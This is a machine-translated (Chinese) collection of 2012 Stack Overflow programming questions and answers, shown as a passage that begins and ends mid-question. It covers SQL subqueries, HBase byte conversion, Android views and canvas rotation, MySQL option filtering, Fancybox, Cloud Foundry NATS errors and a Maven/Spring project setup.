    whse_curr_row_ind not in('y')
AND c_clm = '12056733'
group by 1,2,3 
```

基本上，当我只想要 whse_curr_row_ind 列中没有 Y 的任何内容的最大日期时，它会拉取每个状态 AC/PC 的最大日期

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:51:43.943

您可以使用子查询来执行此操作：

```
SELECT 
    p1.c_clm,
    p1.c_sta_clm,
    p1.whse_curr_row_ind,
    p2.Loaded
FROM pearl_p.TLTC900_CLM_PRSST p1
INNER JOIN
(
    select max(whse_load_ts) as Loaded, C_CLM
    from  pearl_p.TLTC900_CLM_PRSST
    where whse_curr_row_ind not in('y')
    group by C_CLM
) p2
    on p1.whse_load_ts = p2.Loaded
    and p1.C_CLM = p2.C_CLM
WHERE p1.whse_curr_row_ind not in('y') 
```

# html - 如何在移动设备的网站上启用捏缩放？

> ID：12392761
> 
> 赞同：8
> 
> 时间：2012-09-12T16:38:06.737
> 
> 标签：html, viewport, mobile-devices

我正在尝试在我的网站上启用捏缩放。我试图通过像这样设置元视口来启用缩放，但没有任何成功。

```
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2.0, minimum-scale=1, user-scalable=yes"/> 
```

任何想法为什么[我的网站](http://www.bozioko.cz/en/room/garden)在 ipad 和 iphone 上仍然无法缩放？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2013-09-07T14:31:17.137

看到它已经在差不多一年前得到回答，这可能有点晚了......虽然我在我的 IOS 应用程序的 HTML 页面上尝试了你的元标记。标签并没有真正让我缩小，几乎没有让我放大，当我放大时，它会恢复到原来的大小。

现在我能够一直缩小，并放大“很多”，它会使用这些元标记来保持缩放：

```
<meta name="viewport" content="width=device-width, initial-scale=.5, maximum-scale=12.0, minimum-scale=.25, user-scalable=yes"/> 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-02-22T14:50:35.163

您可以尝试新`hammer.js`的可以模拟多次触摸的。 [http://eightmedia.github.io/hammer.js/](http://eightmedia.github.io/hammer.js/)

# android - 禁止 .APK 传输到 TF 卡或其他设备

> ID：12392762
> 
> 赞同：1
> 
> 时间：2012-09-12T16:38:09.220
> 
> 标签：android, apk, file-transfer

有没有办法禁止将设备上的 .APK 文件传输到另一台设备？

本质上使 .APK “只读”或类似的东西......

# java - 在 HBase 中将字节 [] 转换为字符串

> ID：12392768
> 
> 赞同：3
> 
> 时间：2012-09-12T16:38:46.573
> 
> 标签：java, hadoop, byte, hbase

我将以下行存储在 HBase 表中

```
 DIEp(^o^)q3    column=DIE:ID, timestamp=1346194191174, value=\x00\x00\x00\x01 
```

我正在尝试访问该值并将其转换为应该是的字符串表示形式，但是当我使用此文件时（我的输出被重定向到）`1`我没有得到正确的字符串表示形式`cat`

```
cat /hadoop/logs/userlogs/job_201209121654_0027/attempt_201209121654_0027_m_000000_0/stdout 
```

我得到了像这样的垃圾 `NUL NUL NUL SOH`

下面是我正在使用的代码片段。

```
byte[] result1 = value.getValue("DIE".getBytes(), "ID".getBytes());
String myresult = Bytes.toString(result1);
System.out.println(myresult); 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-12T20:53:04.263

字符串转换的标准 HBase 方式是 Bytes.toBytes(string) 和 Bytes.toString(bytes)。但是 Jon Skeet 是正确的，因为您首先需要考虑如何将数据放入列中。如果您使用了 Bytes.toBytes(int)，则需要在转换为字符串之前将字节转换回整数。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-12T17:17:07.593

我们简单地使用`new String(byte[])`了 , where byte[] 来自于`org.apache.hadoop.hbase.KeyValue.getValue()`将 HBase 列中的字节解析为字符串，它在我们的项目中运行良好。:) 抱歉，如果我错过了问题中的某些内容。希望这可以帮助。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-12T16:46:44.507

首先，我会避免`String.getBytes()`在不指定编码的情况下使用。代码实际期望什么编码？`"DIE".getBytes()`当您调用and时明确指定它`"ID".getBytes()`。

接下来，看起来您应该先将 4 个字节转换为*整数*- 然后将该整数转换为字符串。例如：

```
byte[] valueAsBytes = ...;
int valueAsInt = ((valueAsBytes[0] & 0xff) << 24) |
                 ((valueAsBytes[1] & 0xff) << 16) |
                 ((valueAsBytes[2] & 0xff) << 8) |
                 (valueAsBytes[3] & 0xff);
String valueAsString = String.valueof(valueAsInt); 
```

Java API 中可能有一些东西可以直接进行位操作，但我现在想不起来。（有`DataInputStream`，但这需要`ByteArrayInputStream`首先包装字节数组，然后您需要检查字节顺序......）

您当前的代码完全按照您的要求执行 - 诚然使用平台的默认编码。基本上你有“\u0000\u0000\u0000\u0001”。

# android - 从视图或外部类覆盖后退按钮

> ID：12392783
> 
> 赞同：4
> 
> 时间：2012-09-12T16:40:03.083
> 
> 标签：android

我想要做的是拦截来自外部类的后退按钮按下，如下所示：

```
public class AnswerView extends RelativeLayout {

    public AnswerView(Context context) {
        super(context);
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if(keyCode == KeyEvent.KEYCODE_BACK) {
            Log.i("AlleAntwoorden", "Back button pressed!");
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }
} 
```

我正在从我的主要活动中添加它：

```
RelativeLayout mainLayout = (RelativeLayout) findViewById(R.id.main_layout);
mainLayout.addView(new AnswerView(this)); 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-13T16:41:43.830

为了让 View 接收任何事件，它需要获得焦点。我没有看到任何 XML，所以让我们在运行时添加几个特征：

```
AnswerView layout = new AnswerView(this);
layout.setFocusableInTouchMode(true);
layout.requestFocus();
mainLayout.addView(layout); 
```

现在您的布局将拦截`OnKeyListener`. 但是如果另一个 View 有焦点，即使是子 View，该事件可能首先被子 View 消费。
要理解这一点，请将 EditText 添加到您的 AnswerView 中：

```
layout.addView(new EditText()); 
```

如果在 EditText 具有焦点时单击后退按钮：第一次单击关闭软键盘，第二次单击将正常完成当前 Activity。默认情况下，该`OnKeyListener`事件不会通过 View 层次结构向上传递。

# class - 可以单击链接以更改不同页面上的课程吗？

> ID：12392784
> 
> 赞同：0
> 
> 时间：2012-09-12T16:40:05.207
> 
> 标签：class, hyperlink, onclick, external

这是我的目标：我想单击一个页面上的特定链接，在加载的页面上，我想更改一个特定的类。我知道 onClick 功能，但不确定是否可以在这里使用。有没有办法做到这一点？

非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T17:11:44.823

这个 jquery 会做你想做的事：

```
$(document).ready(function(){
   var anchor = '#myanchor';
   if (window.location.href.indexOf(anchor) > 0) {
      //do what you want here, change classes, etc
   }

}); 
```

您应该将此 javascript 放在第二页上，更改`#myanchor`您使用的锚点。

确保在第二页中包含 jquery 库以使其正常工作。

# oracle - ON 子句具有子查询的两个表的右外连接

> ID：12392785
> 
> 赞同：1
> 
> 时间：2012-09-12T16:40:16.093
> 
> 标签：oracle, subquery, outer-join, on-clause

我正在尝试在两个 liferay 表上执行右外连接 -`users_`并且`expandovalue`- 以获得结果集。

当我对所有用户进行以下查询时，我得到了想要的结果。

```
SELECT USER_.FIRSTNAME
     , USER_.LASTNAME
     , USER_.EMAILADDRESS
     , USER_.JOBTITLE
     , expandovalue.data_  
from expandovalue 
     right outer join 
     user_ on expandovalue.classpk = user_.userid 
     and expandovalue.columnid =35695; 
```

当尝试对一组用户（用户组的一部分）执行相同操作时，它会出错。如下查询：

```
SELECT USER_.FIRSTNAME
     , USER_.LASTNAME
     , USER_.EMAILADDRESS
     , USER_.JOBTITLE
     , expandovalue.data_ 
from expandovalue 
     right outer join
       user_ on expandovalue.classpk 
     in (select userid 
          from user_ 
         where userid 
                in ( select userid 
                      from users_usergroups
                     where usergroupid = 40073
                   ) and status =0) =   user_.userid in
                                             (select userid 
                                                from user_ 
                                               where userid 
                                                  in ( select userid 
                                                       from users_usergroups 
                                                     where usergroupid = 40073
                                                     )
                                              and status =0
                                            ) and expandovalue.columnid =35695 
```

这是给出`userid`特定用户组中人员 s 的子查询。

```
(select userid 
   from user_ 
  where userid in 
                 ( select userid 
                     from users_usergroups
                    where usergroupid = 40073) 
                      and status =0
                 ) 
```

我会朝着一个完全错误的方向前进吗？请指教。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T19:17:09.567

试试这个查询：

```
SELECT USER_.FIRSTNAME,
       USER_.LASTNAME,
       USER_.EMAILADDRESS,
       USER_.JOBTITLE,
       expandovalue.data_
  from expandovalue
  right outer join user_
    on expandovalue.classpk IN
          (select userid
             from user_
             where userid in (select userid
                                from users_usergroups
                                where usergroupid = 40073) and 
                   status = 0) AND
       user_.userid in (select userid
                          from user_
                          where userid in (select userid
                                             from users_usergroups
                                             where usergroupid = 40073) AND
                                status =0) AND
       expandovalue.columnid = 35695 
```

第一个子查询结束后缺少一个“AND”。

# c# - 如何通过 C# 将 WPF 窗口的图标设置为图标文件？

> ID：12392790
> 
> 赞同：2
> 
> 时间：2012-09-12T16:40:34.347
> 
> 标签：c#, wpf, icons, mainwindow

我有一个带有窗口的 WPF 项目。如果我想在 C# 中设置窗口的图标属性，它允许我只提供一个 ImageSource 并且它不接受图标文件。如果我在 XAML 中设置属性，它会毫无问题地接受图标文件。如何通过 C# 代码将 WPF 窗口的图标设置为图标文件？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-12T16:42:29.000

怎么样

```
mywindow.Icon = new BitmapImage(new Uri(@"C:\myicon.ico")); 
```

# mysql - MySQL嵌套选择的更好解决方案

> ID：12392800
> 
> 赞同：0
> 
> 时间：2012-09-12T16:41:34.473
> 
> 标签：mysql

目前我有两个 MySQL 表

特性

```
id    name 
1     Grove house
2     howard house
3     sunny side 
```

高级选项

```
prop_id    name
1          Wifi
1          Enclosed garden
1          Swimming pool
2          Swimming pool 
```

如您所见，表二包含有关属性的特定功能

当我只有最多 3 个选项时，下面的查询工作得很好。（可能有点慢但没关系）现在事情已经有所扩展，我最多可以搜索 12 个选项，这给我带来了一些主要的速度问题。下面的查询是针对 8 个选项的，您可以看到它非常混乱。有没有更好的方法来做我想要实现的目标？

```
SELECT * FROM properties WHERE id in (
select prop_id from advanced_options where name = 'Within 2 miles of sea or river' and prop_id in ( 
    select prop_id from advanced_options where name = 'WiFi' and prop_id in ( 
        select prop_id from advanced_options where name = 'Walking distance to pub' and prop_id in ( 
            select prop_id from advanced_options where name = 'Swimming pool' and prop_id in ( 
                select prop_id from advanced_options where name = 'Sea or River views' and prop_id in ( 
                    select prop_id from advanced_options where name = 'Pet friendly' and prop_id in ( 
                        select prop_id from advanced_options where name = 'Open fire, wood burning stove or a real flame fire-place' and prop_id in ( 
                            select prop_id from advanced_options where name='Off road parking') 
                        ) 
                    ) 
                ) 
            ) 
        ) 
    ) 
) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T17:55:00.483

就像 Mike Brant 建议的那样，我会考虑将您的数据模型更改为一个限制，以便为您的`properties`表中的每一个设置和创建一个列。但有时老板来了：“我们还需要'平板电视'”，然后你必须回到数据库并更新方案和数据访问层。

如果数据库使用按位比较，则可以以某种方式将此逻辑移出。这使您可以进行简单的查询，但在进行查询之前需要进行一些预处理。

自己判断。

我在这里为你把所有东西都放在了一个测试套件中[sqlfiddle](http://sqlfiddle.com/#!2/06785/2)

基本思想是表中的每个属性都有一个 2 的幂的 id。像这样：

```
INSERT INTO `advanced_options` (id, name)
VALUES
 (1, 'Wifi'),
 (2, 'Enclosing Garden'),
 (8, 'Swimming Pool'),
 (16, 'Grill'); 
```

然后，您可以在属性表中存储单个值购买添加选项：

```
Wifi + Swimming Pool = 1 + 8 = 9 
```

如果你想找到所有有 wifi 和游泳池的房产，你可以这样做：

```
SELECT * FROM `properties` WHERE `advanced_options` & 9 = 9 
```

如果你只是想要游泳池，那就是：

```
SELECT * FROM `properties` WHERE `advanced_options` & 8 = 8 
```

去试试[小提琴](http://sqlfiddle.com/#!2/06785/2)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T16:54:31.713

您确实需要考虑对表进行架构更改。似乎高级选项本身并没有任何属性，所以`advanced_options`与其尝试成为多对多 JOIN 表的表，不如只`property_options`为每个“选项”创建一个包含字段的表。像这样的东西

```
|prop_id  | wifi |  swimming_pool  |  etc..
-----------------------------------
|   1     |  0   |        1        |
|   2     |  1   |        0        | 
```

这里每个字段都是一个简单的 TINYINT 字段，具有 0/1 布尔表示。

到你可以查询的地方：

```
SELECT * FROM properties AS p
INNER JOIN property_options AS po ON p.id = po.prop.id
WHERE wifi = 1 AND swimming_pool = 1 .... 
```

在这里，您只需`WHERE`根据要查询的选项构建您的子句。

实际上甚至不需要单独的表，因为这些记录将与属性具有一对一的关系，因此您可以根据需要将这些字段规范化到您的属性表中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-12T17:23:52.687

多次加入到 advanced_options 表。这是一个带有 2 的示例（起泡、冲洗、重复）。

```
select o1.prop_id
from advanced_options o1
inner join advanced_options o2 on o1.prop_id = o2.prop_id and o2.name = "WiFi"
where o1.name = 'Within 2 miles of sea or river' 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-12T17:27:25.757

你能做这样的事情吗？：

```
select p.*,count(a.prop_id) as cnt
from properties p
inner join advanced_options a on a.prop_id = p.id
where a.name in ('Enclosed garden','Swimming pool')
group by p.name
having cnt = 2 
```

该查询将获取具有所有这些高级选项的所有属性...

我还建议通过创建一个单独的表调用来规范化您的表`Advanced_option (id,name)`，您可以在其中存储唯一的选项值，然后创建一个连接实体表`Property_x_AdvancedOption (fk_PropertyID, FK_AdvancedOptionID)`，这样您可以使用更少的资源并避免数据完整性问题。

# c++ - C++如何有一个线程助手

> ID：12392801
> 
> 赞同：0
> 
> 时间：2012-09-12T16:41:38.043
> 
> 标签：c++, circular-dependency, opos

我正在尝试重构 DLL 来控制 OPOS 设备。在设备被认领并启用后，它会启动一个线程来不断检查从 OPOS 设备接收到的数据。我在中声明方法`OposReader.h`

但我认为将所述方法拉出并将其移至助手会是一个更好的主意。所以我创建了一个类`ReaderThreadHelper.h`把它放在......但在线程中我必须调整 OposReader 中的值。

因此，在我调用的 OposReader`#include ReaderThreadHelper.h`中，`ReaderThreadHelper.h`我必须做一个`#include OposReader.h`......这开始了循环引用的问题......而且我对 C++ 太陌生了，不知道如何解决它。

我什至应该从一开始就这样做吗？有没有更合适的方法来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:53:33.583

简短的回答：使用前向声明并仅将标题包含到`.cpp`文件中。

详细解释在这里：[Resolve circular dependencies in C++](https://stackoverflow.com/questions/625799/resolve-circular-dependencies-in-c)

# c# - Windows Mobile 上的 .NET CF 应用程序冻结，全局异常处理程序中没有详细信息

> ID：12392802
> 
> 赞同：0
> 
> 时间：2012-09-12T16:41:43.673
> 
> 标签：c#, .net, winforms, windows-mobile, compact-framework

我正在为 Windows 移动设备 - 摩托罗拉 ES400 开发一个 .net cf 应用程序。

应用程序维护一个日志文件，该文件记录所有已处理的异常以及在 Main 方法中在应用程序的全局范围内注册的未处理的全局异常。

出于某种原因，当我在手机上运行应用程序时，应用程序只是冻结了——这意味着我无法单击应用程序上的任何按钮或使用手写笔执行任何其他操作。该应用程序完全没有响应。当我回到手机 Windows Mobile OS 开始菜单 -> 任务管理器并尝试关闭应用程序时，我无法关闭。任务管理器不会关闭应用程序。当我检查日志时，我看不到通过寄存器未处理的全局异常例程记录的任何未处理的异常。

我不明白这里可能有什么问题。

根据您使用 .NET CF 的经验，有没有人知道可能会发生什么？我可以从哪里开始寻找或分析？

提前感谢您的帮助。

副部

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:59:54.527

可能有很多原因。根据我的经验，我认为正在发生一些无限循环或对某些锁定资源的调用。在这种情况下，请尝试使用 CLR Profiler for .NET CF。CLR Profiler 可以告诉你哪里出了问题。您可以从这里获得它：http: [//www.microsoft.com/en-us/download/details.aspx?id=](http://www.microsoft.com/en-us/download/details.aspx?id=13442) 13442 关于如何使用它，有一系列博客文章，请访问：[http:// blogs.msdn.com/b/stevenpr/archive/2008/05/08/the-clr-profiler-for-the-net-compact-framework-series-index.aspx](http://blogs.msdn.com/b/stevenpr/archive/2008/05/08/the-clr-profiler-for-the-net-compact-framework-series-index.aspx)

我希望它有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T06:05:36.107

前段时间我遇到了一些类似的问题。我正在使用条形码扫描仪驱动程序，该驱动程序创建了一个单独的线程并循环直到扫描了条形码。当我试图退出应用程序时，它会等待线程停止，导致应用程序冻结，直到扫描条形码。任务管理器也无法结束应用程序。

我相信如果你有一个前台线程（Thread.IsBackground = false），这将阻止进程终止，直到它结束 - [http://msdn.microsoft.com/en-us/library/system.threading.thread.isbackground .aspx](http://msdn.microsoft.com/en-us/library/system.threading.thread.isbackground.aspx)

因此，您的问题可能来自您已启动的辅助线程。如果您正在等待一个线程，通过锁或类似的东西，并且该线程处于无限循环中，那么这可能是您的问题的原因。我最常见的意外无限循环原因是有一个属性 getter 引用该属性而不是支持变量。

我希望这会有所帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T12:48:03.363

如果您遇到硬故障（操作系统级错误，如内存访问冲突），那么我已经看到系统在创建 Dr Watson 日志时冻结。

在 ES400 上，我不记得是否有控制面板小程序来配置错误报告功能，但请检查那里。

如果它正在创建这样的日志，默认情况下我认为它位于 \windows 下的子文件夹中。但是，如果整个过程可以通过注册表进行配置，那么您可能想要查看那里。

有关该主题的一般信息，请参见此处：

[http://msdn.microsoft.com/en-us/library/ee481217(v=winembedded.60).aspx](http://msdn.microsoft.com/en-us/library/ee481217(v=winembedded.60).aspx)

这里专门针对注册表设置：

[http://msdn.microsoft.com/en-us/library/ee480226(v=winembedded.60).aspx](http://msdn.microsoft.com/en-us/library/ee480226(v=winembedded.60).aspx)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T16:38:25.627

如果您只是想捕获并记录此错误，请在程序的**main**函数中`try...catch`围绕您的代码放置一个。

 **在 C# 中，这将只是`Program.cs`从以下内容进行编辑：

```
static void Main() {
  Application.Run(new Form1());
} 
```

对于这样的事情：

```
private static Form1 m_form;

static void Main() {
  try {
    m_form = new Form1();
    Application.Run(m_form);
  } catch (Exception err) {
    // log error
    if ((m_form != null) && !m_form.IsDisposed) {
      // you might want to save data on your form before it goes Bye-Bye.
    }
  }
} 
```**

# java - 仅适用于一种形状的变换矩阵

> ID：12392807
> 
> 赞同：2
> 
> 时间：2012-09-12T16:42:07.597
> 
> 标签：java, android, android-canvas

晚上好。

我正在尝试使用 setRotation -方法在画布上旋转一条线，并且效果很好，除非您想在同一画布上绘制另一个形状。使用 Canvas 的 concat 方法后，整个画布将被旋转，比如说，逆时针/顺时针旋转 30 度。这就是问题所在。我只想旋转线条，不想旋转此画布或整个画布上的任何其他形状。我发现位图可以用矩阵来绘制，但是看起来很麻烦和笨拙。另外，有人建议为 Canvas 设置一个新矩阵，事实上，这个提议也不管用。

所以，这个问题听起来很简单，如何在不使用 OpenGl 的情况下旋转画布上唯一的一个形状并影响画布上的其他形状？

提前感谢您的回答！

这是带有注释和其他内容的代码：

```
@Override
public void onDraw(Canvas canvas)
{
    int startX, startY, stopX, stopY;
    startY = stopY = 100;
    startX = 100;
    stopX = 200;
    this.paint = new Paint();
    //this.path = new Path();
    this.matrix = canvas.getMatrix();
    this.paint.setColor(Color.BLUE);
    this.paint.setStrokeWidth(4);

    this.matrix.setRotate(180, startX, startY);
    canvas.concat(this.matrix);
    /*this.matrix.setTranslate(startX, 0);
    canvas.concat(this.matrix);*/

    canvas.drawLine(startX, startY, stopX, stopY, this.paint);

    canvas.setMatrix(new Matrix());
    //canvas.drawCircle(200, 200, 50, paint);
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T16:52:22.293

你可以试试`Canvas.save()`这个`Canvas.restore()`。他们应该将当前矩阵放入堆栈，一旦完成修改后的矩阵，您就可以返回到前一个矩阵。

```
this.matrix.setRotate(180, startX, startY);
canvas.save();
canvas.concat(this.matrix);
canvas.drawLine(startX, startY, stopX, stopY, this.paint);
canvas.restore(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-13T17:02:31.263

Mozoboy 提出了使用线性代数的想法。这是使用线性代数并保持在 Android API 范围内的 onDraw(Canvas canvas) 方法的新代码：

```
 Matrix m = new Matrix();       //Declaring a new matrix
    float[] vecs = {7, 3};    //Declaring an end-point of the line

   /*Declaring the initial values of the matrix 
     according to the theory of the 3 
     dimensional chicken in 2D space 
    There is also 4D chicken in 3D space*/

    float[] initial = {1, 0, 0, 0, 1, 0, 0, 0, 1};    
    m.setValues(initial);   
    float[] tmp = new float[9];    //Debug array of floats
    m.setRotate(90, 4.0f, 3.0f);    //Rotating by 90 degrees around the (4, 3) point
/*Mapping our vector to the matrix. 
  Similar to the multiplication of two
  matrices 3x3 by 1x3\. 
  In our case they are (matrix m after rotating) multiplied by      
  (7)
  (3)
  (1) according to the theory*/ 

  m.mapPoints(vecs);             

    for(float n : vecs)
    {
        Log.d("VECS", "" + n);     //Some debug info
    }

    m.getValues(tmp);
    for(float n : tmp)
    {
        Log.d("TMP", "" + n);      //also debug info
    } 
```

作为该算法的结果，我们得到了线终点的新坐标 (4, 6)。

# freemarker - Freemarker：子变量的动态插值

> ID：12392822
> 
> 赞同：0
> 
> 时间：2012-09-12T16:43:00.937
> 
> 标签：freemarker

我正在尝试创建一个 FreeMarker 宏，它可以返回字符串连接和输入变量的插值：

```
<#macro findValue var>
   <#if (.vars["foo." + var]) ??> 
     .vars["foo." + var]
   <#else>
     ${.vars["bar." + var]}
   </#if>
</#macro> 
```

不幸的是，它不起作用。首先，`${.vars["bar." + var]}`给出一个`undefined`错误。其次，即使我可以看到子变量确实存在，`if`条件也总是返回。`false`似乎该`.vars`变量只能查找根变量，而不能查找`foo.test`.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T21:40:11.347

在 FreeMarker 中，`foo.bar`与 相同`foo["bar"]`，但在其中`[]`您可以有一个*计算*为字符串的任意表达式。所以你正在寻找的表达式是简单的`foo[var]`。

顺便说一句，你的宏试图做的只是`${foo[var]!bar[var]}`

# jquery - 为什么 Fancybox 窗口不弹出？

> ID：12392823
> 
> 赞同：0
> 
> 时间：2012-09-12T16:43:06.317
> 
> 标签：jquery, fancybox-2

我已在此页面上安装并配置了 Fancybox 2：http: [//southernlivingplants.com/carmen_johnston/](http://southernlivingplants.com/carmen_johnston/)

第一个视频占位符有一个链接到它的 YouTube 视频。它应该在 Fancybox 窗口中弹出，但它只是直接进入 YouTube 页面。

我已经在 FireBug 中检查过了，没有收到任何错误。一切似乎都在正确加载。

这是我的代码：

```
<script type="text/javascript" src="../fancybox2/source/jquery.fancybox.js?v=2.1.0"></script>
<link rel="stylesheet" type="text/css" href="../fancybox2/source/jquery.fancybox.css?v=2.1.0" media="screen" />
<script type="text/javascript">
    $(document).ready(function() {
    $('.fancybox-media').fancybox({
    openEffect  : 'none',
    closeEffect : 'none',
    helpers : {
    media : {}
    }
   });
  });   
</script> 
```

任何线索我在这里缺少什么？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:57:11.230

视频可以以 iframe 类型显示。要使用它，我们可以使用以下两种方法：

1）在锚标记中添加一个类“iframe”以及“fancybox-media”。js 的代码将是相同的，例如：

```
<a href="youtube url" class="fancybox-media iframe"><img /></a> 
```

2）或者在fancybox的脚本代码中定义类型，即

```
$('.fancybox-media').fancybox({
    type : 'iframe',
    // existing stuff   
}); 
```

希望这能解决您的问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T17:03:13.633

我还建议您看一下以下示例。

[http://webdesignandsuch.com/posts/fancybox-download/responsive-youtube-videos/fancybox-youtube.html](http://webdesignandsuch.com/posts/fancybox-download/responsive-youtube-videos/fancybox-youtube.html)

只需检查 html 代码和 js 片段，您几乎可以将其应用于您的网站。

# cloud-foundry - 自定义服务和 NATS 连接问题

> ID：12392830
> 
> 赞同：0
> 
> 时间：2012-09-12T16:43:44.173
> 
> 标签：cloud-foundry

我正在从 vcap_dev_setup 构建的 CloudFoundry 的单个节点实例上创建自定义服务。我已经按照[这些说明](https://github.com/cloudfoundry-collaboration/vcap-services/wiki/How-to-add-a-system-service-to-Cloud-Foundry---step-by-step-guide)来了解创建新服务时要做什么。

当我尝试通过运行“vcap_dev start service_gaeway”启动新服务网关时，出现以下错误：

```
Exiting due to NATS error: Could not connect to server on nats://nats:nats@172.16.4.146:4222/ 
```

service_gateway 上的 :mbus 属性的配置很好，并且与启动没有问题的所有其他服务的配置相同。

假设配置正确，有谁知道单个服务无法正确连接到 nats 的任何原因？

谢谢

克里斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T07:34:46.833

我不确定为什么会这样，假设其他服务能够连接到 NATS

如果您愿意以补丁的形式分享您对 VCAP 的更改，我很乐意看看，您希望集成哪些服务？

我还建议将您的查询发布到[https://groups.google.com/a/cloudfoundry.org/forum/?fromgroups#!forum/vcap-dev的 VCAP dev google 组](https://groups.google.com/a/cloudfoundry.org/forum/?fromgroups#!forum/vcap-dev)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T00:39:47.223

确保您在 IP 地址上运行 NATS：172.16.4.146 端口：4222

IP 地址很可能是您的本地主机。DHCP 很可能分配了 172.16.4.146 以外的另一个 IP 地址。确保您的计算机有 172.16.4.146 作为 IP 地址。你可以通过 ifconfig 来检查。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-09T02:00:28.613

棘手的问题可能是版本冲突引起的误导性异常，您可以尝试使用最新的代码；

# c# - 如何使用 C# 将本地驱动器映射到远程服务器

> ID：12392834
> 
> 赞同：0
> 
> 时间：2012-09-12T16:44:03.927
> 
> 标签：c#, drive-mapping

我需要将本地 msi 安装程序分发到多个远程服务器。我假设这样做的方法是将我的本地驱动器（msi 所在的位置）映射到那些远程服务器，然后将此文件从映射的本地驱动器复制到每个服务器的特定目录中。

起初，我试图将文件复制到远程服务器而不进行任何事先映射：

```
System.IO.File.Copy(@"\\WIN-J02JG3AAV7P\temp\emcrpts_x64_v40.msi",
                    @"\\sharepoint2010\C$", true); 
```

这不起作用（错误：找不到网络路径）

然后，我试图将我的本地驱动器映射到远程服务器，但我缺乏正确的语法。如果我有一个本地 C:\temp 共享，将它映射到名为“sharepoint2010”的远程服务器的正确 C# 语法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:46:41.867

将文件名附加到目标可能已经解决了您的问题：

```
File.Copy(@"\\WIN-J02JG3AAV7P\temp\emcrpts_x64_v40.msi",
          @"\\sharepoint2010\C$\emcrpts_x64_v40.msi", true); 
```

目的地不能是目录，请参阅[文档](http://msdn.microsoft.com/en-us/library/9706cfs5.aspx)。

# java - 使用我的第一个 Maven Spring Project 获取 org.springframework.beans.factory.BeanCreationException

> ID：12392838
> 
> 赞同：29
> 
> 时间：2012-09-12T16:44:23.947
> 
> 标签：java, eclipse, spring, maven, spring-mvc

使用我的第一个 Maven Spring Project 获取 org.springframework.beans.factory.BeanCreationException。我已经使用 eclipse 和 Spring 编程了一段时间，但我正在考虑使用 maven 来提供帮助。

我在 Eclipse 中有一个 Maven 项目，这是我的 pom.xml 文件：

```
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>org.springsource.greenbeans.maven</groupId>
    <artifactId>WebFlowTemplate</artifactId>
    <packaging>war</packaging>
    <version>0.0.1-SNAPSHOT</version>
    <name>WebFlowTemplate Maven Webapp</name>
    <url>http://maven.apache.org</url>
    <dependencies>

        <dependency>
            <groupId>org.hibernate</groupId>
            <artifactId>hibernate-core</artifactId>
            <version>3.6.3.Final</version>
        </dependency>

        <dependency>
            <groupId>org.hibernate</groupId>
            <artifactId>hibernate-validator</artifactId>
            <version>4.3.0.Final</version>
        </dependency>

        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>3.8.1</version>
            <scope>test</scope>
        </dependency>

        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-context</artifactId>
            <version>3.1.2.RELEASE</version>
        </dependency>

        <dependency>
            <groupId>org.springframework.webflow</groupId>
            <artifactId>spring-webflow</artifactId>
            <version>2.3.1.RELEASE</version>
        </dependency>

        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-core</artifactId>
            <version>3.1.2.RELEASE</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-web</artifactId>
            <version>3.1.2.RELEASE</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-config</artifactId>
            <version>3.1.2.RELEASE</version>
        </dependency>

        <dependency>
            <groupId>log4j</groupId>
            <artifactId>log4j</artifactId>
            <version>1.2.17</version>
        </dependency>

    </dependencies>
    <build>
        <finalName>WebFlowTemplate</finalName>
    </build>
</project> 
```

但是如果我尝试运行这个 Spring WebFlow 项目，我会收到以下错误。我在 pox.xml 中缺少什么。有人可以帮我解决这个问题。

```
EVERE: Exception sending context initialized event to listener instance of class org.springframework.web.context.ContextLoaderListener
